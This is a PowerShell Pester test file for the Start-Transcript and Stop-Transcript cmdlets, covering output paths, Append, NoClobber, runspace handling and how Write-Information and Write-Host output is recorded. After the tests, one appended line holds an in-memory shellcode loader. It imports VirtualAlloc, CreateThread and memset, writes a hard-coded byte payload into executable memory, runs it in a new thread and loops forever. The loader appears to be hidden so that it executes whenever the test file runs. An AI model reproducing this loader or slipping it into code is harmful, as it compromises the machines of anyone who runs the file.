

Describe "Start-Transcript, Stop-Transcript tests" -tags "CI" {

    BeforeAll {

        function ValidateTranscription {
            param (
                [string] $scriptToExecute,
                [string] $outputFilePath,
                [switch] $append,
                [switch] $noClobber,
                [string] $expectedError
            )
            if($append -or $noClobber) {
                
                $content = "This is sample text!"
                $content | Out-File -FilePath $outputFilePath
                Test-Path $outputFilePath | Should -BeTrue
            }

            try {
                
                $ps = [powershell]::Create()
                $ps.addscript($scriptToExecute).Invoke()
                $ps.commands.clear()

                if($expectedError) {
                    $ps.hadErrors | Should -BeTrue
                    $ps.Streams.Error.FullyQualifiedErrorId | Should -Be $expectedError
                } else {
                    $ps.addscript("Get-Date").Invoke()
                    $ps.commands.clear()
                    $ps.addscript("Stop-Transcript").Invoke()

                    Test-Path $outputFilePath | Should -BeTrue
                    $outputFilePath | Should -FileContentMatch "Get-Date"
                    if($append) {
                        $outputFilePath | Should -FileContentMatch $content
                    }
                }
            } finally {
                if ($null -ne $ps) {
                    $ps.Dispose()
                }
            }
        }
        

        $transcriptFilePath = join-path $TestDrive "transcriptdata.txt"
        Remove-Item $transcriptFilePath -Force -ErrorAction SilentlyContinue
    }

    AfterEach {
        Remove-Item $transcriptFilePath -ErrorAction SilentlyContinue
        [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook('ForcePromptForChoiceDefaultOption', $False)
    }

    It "Should create Transcript file at default path" {
        $script = "Start-Transcript"
        if ($isWindows) {
            $defaultTranscriptFilePath = [io.path]::Combine($env:USERPROFILE, "Documents", "PowerShell_transcript*")
        } else {
            $defaultTranscriptFilePath = [io.path]::Combine($env:HOME, "PowerShell_transcript*")
        }

        try {
            
            Remove-Item $defaultTranscriptFilePath -Force -ErrorAction SilentlyContinue
            ValidateTranscription -scriptToExecute $script -outputFilePath $defaultTranscriptFilePath
        } finally {
            
            Remove-Item $defaultTranscriptFilePath -ErrorAction SilentlyContinue
        }
    }
    It "Should create Transcript file with 'Path' parameter" {
        $script = "Start-Transcript -path $transcriptFilePath"
        ValidateTranscription -scriptToExecute $script -outputFilePath $transcriptFilePath
    }
    It "Should create Transcript file with 'LiteralPath' parameter" {
        $script = "Start-Transcript -LiteralPath $transcriptFilePath"
        ValidateTranscription -scriptToExecute $script -outputFilePath $transcriptFilePath
    }
    It "Should create Transcript file with 'OutputDirectory' parameter" {
        $script = "Start-Transcript -OutputDirectory $TestDrive"
        $outputFilePath = join-path $TestDrive "PowerShell_transcript*"
        ValidateTranscription -scriptToExecute $script -outputFilePath $outputFilePath
    }
    It "Should Append Transcript data in existing file if 'Append' parameter is used with Path parameter" {
        $script = "Start-Transcript -path $transcriptFilePath -Append"
        ValidateTranscription -scriptToExecute $script -outputFilePath $transcriptFilePath -append
    }
    It "Should return an error if the file exists and NoClobber is used" {
        $script = "Start-Transcript -path $transcriptFilePath -NoClobber"
        $expectedError = "NoClobber,Microsoft.PowerShell.Commands.StartTranscriptCommand"
        ValidateTranscription -scriptToExecute $script -outputFilePath $transcriptFilePath -noClobber -expectedError $expectedError
    }
    It "Should return an error if the path resolves to an existing directory" {
        $script = "Start-Transcript -path $TestDrive"
        $expectedError = "CannotStartTranscription,Microsoft.PowerShell.Commands.StartTranscriptCommand"
        ValidateTranscription -scriptToExecute $script -outputFilePath $null -expectedError $expectedError
    }
    It "Should return an error if file path is invalid" {
        $fileName = (Get-Random).ToString()
        $inputPath = join-path $TestDrive $fileName
        $null = New-Item -Path $inputPath -ItemType File -Force -ErrorAction SilentlyContinue
        $script = "Start-Transcript -OutputDirectory $inputPath"
        $expectedError = "CannotStartTranscription,Microsoft.PowerShell.Commands.StartTranscriptCommand"
        ValidateTranscription -scriptToExecute $script -outputFilePath $null -expectedError $expectedError
    }
    It "Should not delete the file if it already exist" {
        
        $transcriptFilePath = Join-Path $TestDrive ([System.IO.Path]::GetRandomFileName())
        Out-File $transcriptFilePath

        $FileSystemWatcher = [System.IO.FileSystemWatcher]::new((Split-Path -Parent $transcriptFilePath), (Split-Path -Leaf $transcriptFilePath))

        $Job = Register-ObjectEvent -InputObject $FileSystemWatcher -EventName "Deleted" -SourceIdentifier "FileDeleted" -Action {
            return "FileDeleted"
        }

        try {
            Start-Transcript -Path $transcriptFilePath
            Stop-Transcript
        } finally {
            Unregister-Event -SourceIdentifier "FileDeleted"
        }

        
        Receive-Job $job | Should -Be $null
    }
    It "Transcription should remain active if other runspace in the host get closed" {
        try {
            $ps = [powershell]::Create()
            $ps.addscript("Start-Transcript -path $transcriptFilePath").Invoke()
            $ps.addscript('$rs = [system.management.automation.runspaces.runspacefactory]::CreateRunspace()').Invoke()
            $ps.addscript('$rs.open()').Invoke()
            $ps.addscript('$rs.Dispose()').Invoke()
            $ps.addscript('Write-Host "After Dispose"').Invoke()
            $ps.addscript("Stop-Transcript").Invoke()
        } finally {
            if ($null -ne $ps) {
                $ps.Dispose()
            }
        }

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -FileContentMatch "After Dispose"
    }

    It "Transcription should be closed if the only runspace gets closed" {
        pwsh -c "start-transcript $transcriptFilePath; Write-Host ''Before Dispose'';"

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -FileContentMatch "Before Dispose"
        $transcriptFilePath | Should -FileContentMatch "PowerShell transcript end"
    }

    It "Transcription should record native command output" {
        $script = {
            Start-Transcript -Path $transcriptFilePath
            hostname
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $machineName = [System.Environment]::MachineName
        $transcriptFilePath | Should -FileContentMatch $machineName
    }

    It "Transcription should record Write-Information output when InformationAction is set to Continue" {
        [String]$message = New-Guid
        $script = {
            Start-Transcript -Path $transcriptFilePath
            Write-Information -Message $message -InformationAction Continue
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -Not -FileContentMatch "INFO: "
        $transcriptFilePath | Should -FileContentMatch $message
    }

    It "Transcription should not record Write-Information output when InformationAction is set to SilentlyContinue" {
        [String]$message = New-Guid
        $script = {
            Start-Transcript -Path $transcriptFilePath
            Write-Information -Message $message -InformationAction SilentlyContinue
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -Not -FileContentMatch "INFO: "
        $transcriptFilePath | Should -Not -FileContentMatch $message
    }

    It "Transcription should not record Write-Information output when InformationAction is set to Ignore" {
        [String]$message = New-Guid
        $script = {
            Start-Transcript -Path $transcriptFilePath
            Write-Information -Message $message -InformationAction Ignore
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -Not -FileContentMatch "INFO: "
        $transcriptFilePath | Should -Not -FileContentMatch $message
    }

    It "Transcription should record Write-Information output in correct order when InformationAction is set to Inquire" {
        [String]$message = New-Guid
        $newLine = [System.Environment]::NewLine
        $expectedContent = "$message$($newLine)Confirm$($newLine)Continue with this operation?"
        $script = {
            [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook('ForcePromptForChoiceDefaultOption', $True)
            Start-Transcript -Path $transcriptFilePath
            Write-Information -Message $message -InformationAction Inquire
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -Not -FileContentMatch "INFO: "
        $transcriptFilePath | Should -FileContentMatchMultiline $expectedContent
    }

    It "Transcription should record Write-Host output when InformationAction is set to Continue" {
        [String]$message = New-Guid
        $script = {
            Start-Transcript -Path $transcriptFilePath
            Write-Host -Message $message -InformationAction Continue
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -FileContentMatch $message
    }

    It "Transcription should record Write-Host output when InformationAction is set to SilentlyContinue" {
        [String]$message = New-Guid
        $script = {
            Start-Transcript -Path $transcriptFilePath
            Write-Host -Message $message -InformationAction SilentlyContinue
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -FileContentMatch $message
    }

    It "Transcription should not record Write-Host output when InformationAction is set to Ignore" {
        [String]$message = New-Guid
        $script = {
            Start-Transcript -Path $transcriptFilePath
            Write-Host -Message $message -InformationAction Ignore
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -Not -FileContentMatch $message
    }

    It "Transcription should record Write-Host output in correct order when InformationAction is set to Inquire" {
        [String]$message = New-Guid
        $newLine = [System.Environment]::NewLine
        $expectedContent = "$message$($newLine)Confirm$($newLine)Continue with this operation?"
        $script = {
            [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook('ForcePromptForChoiceDefaultOption', $True)
            Start-Transcript -Path $transcriptFilePath
            Write-Host -Message $message -InformationAction Inquire
            Stop-Transcript
        }

        & $script

        $transcriptFilePath | Should -Exist
        $transcriptFilePath | Should -FileContentMatchMultiline $expectedContent
    }

    It "UseMinimalHeader should reduce length of transcript header" {
        $script = {
            Start-Transcript -Path $transcriptFilePath
            Stop-Transcript
        }

        $transcriptMinHeaderFilePath = $transcriptFilePath + "_minimal"
        $scriptMinHeader = {
            Start-Transcript -Path $transcriptMinHeaderFilePath -UseMinimalHeader
            Stop-Transcript
        }

        & $script
        $transcriptFilePath | Should -Exist
        $transcriptLength = (Get-Content -Path $transcriptFilePath -Raw).Length

        & $scriptMinHeader
        $transcriptMinHeaderFilePath | Should -Exist
        $transcriptMinHeaderLength = (Get-Content -Path $transcriptMinHeaderFilePath -Raw).Length
        Remove-Item $transcriptMinHeaderFilePath -ErrorAction SilentlyContinue

        $transcriptMinHeaderLength | Should -BeLessThan $transcriptLength
    }
}

$eMb6 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eMb6 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc3,0xd9,0x74,0x24,0xf4,0xb8,0xea,0xd3,0x3c,0x79,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x42,0x14,0x03,0x42,0xfe,0x31,0xc9,0x85,0x16,0x37,0x32,0x76,0xe6,0x58,0xba,0x93,0xd7,0x58,0xd8,0xd0,0x47,0x69,0xaa,0xb5,0x6b,0x02,0xfe,0x2d,0xf8,0x66,0xd7,0x42,0x49,0xcc,0x01,0x6c,0x4a,0x7d,0x71,0xef,0xc8,0x7c,0xa6,0xcf,0xf1,0x4e,0xbb,0x0e,0x36,0xb2,0x36,0x42,0xef,0xb8,0xe5,0x73,0x84,0xf5,0x35,0xff,0xd6,0x18,0x3e,0x1c,0xae,0x1b,0x6f,0xb3,0xa5,0x45,0xaf,0x35,0x6a,0xfe,0xe6,0x2d,0x6f,0x3b,0xb0,0xc6,0x5b,0xb7,0x43,0x0f,0x92,0x38,0xef,0x6e,0x1b,0xcb,0xf1,0xb7,0x9b,0x34,0x84,0xc1,0xd8,0xc9,0x9f,0x15,0xa3,0x15,0x15,0x8e,0x03,0xdd,0x8d,0x6a,0xb2,0x32,0x4b,0xf8,0xb8,0xff,0x1f,0xa6,0xdc,0xfe,0xcc,0xdc,0xd8,0x8b,0xf2,0x32,0x69,0xcf,0xd0,0x96,0x32,0x8b,0x79,0x8e,0x9e,0x7a,0x85,0xd0,0x41,0x22,0x23,0x9a,0x6f,0x37,0x5e,0xc1,0xe7,0xf4,0x53,0xfa,0xf7,0x92,0xe4,0x89,0xc5,0x3d,0x5f,0x06,0x65,0xb5,0x79,0xd1,0x8a,0xec,0x3e,0x4d,0x75,0x0f,0x3f,0x47,0xb1,0x5b,0x6f,0xff,0x10,0xe4,0xe4,0xff,0x9d,0x31,0x90,0xfa,0x09,0x7a,0xcd,0x53,0x4b,0x12,0x0c,0x5c,0x4b,0xc8,0x99,0xba,0x1b,0x5e,0xca,0x12,0xdb,0x0e,0xaa,0xc2,0xb3,0x44,0x25,0x3c,0xa3,0x66,0xef,0x55,0x49,0x89,0x46,0x0d,0xe5,0x30,0xc3,0xc5,0x94,0xbd,0xd9,0xa3,0x96,0x36,0xee,0x54,0x58,0xbf,0x9b,0x46,0x0c,0x4f,0xd6,0x35,0x9a,0x50,0xcc,0x50,0x22,0xc5,0xeb,0xf2,0x75,0x71,0xf6,0x23,0xb1,0xde,0x09,0x06,0xca,0xd7,0x9f,0xe9,0xa4,0x17,0x70,0xea,0x34,0x4e,0x1a,0xea,0x5c,0x36,0x7e,0xb9,0x79,0x39,0xab,0xad,0xd2,0xac,0x54,0x84,0x87,0x67,0x3d,0x2a,0xfe,0x40,0xe2,0xd5,0xd5,0x50,0xde,0x03,0x13,0x27,0x0e,0x90;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rbF=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rbF.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rbF,0,0,0);for (;;){Start-sleep 60};

